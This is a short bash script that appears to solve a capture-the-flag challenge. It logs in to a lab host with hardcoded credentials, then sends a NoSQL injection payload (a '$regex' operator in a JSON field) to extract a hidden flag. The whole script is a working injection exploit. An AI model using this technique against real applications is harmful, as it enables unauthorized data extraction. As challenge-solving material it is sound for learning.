#!/usr/bin/env bash
#
URL=${1:-"https://10.13.37.101"}
echo "Using host: $URL"

(curl -s -k -L -c cookies.txt -d "email=boogy@insomni.hack&password=ouQAgFaXZ5qDi8r" "$URL/login") &>/dev/null
(curl -s -k -L -b cookies.txt -H "Content-Type:application/json" -d '{"firstname": { "$regex": "^(Unguessable.*)"}}' "$URL/humans") | egrep -io "INS{.*}"

rm -f cookies.txt
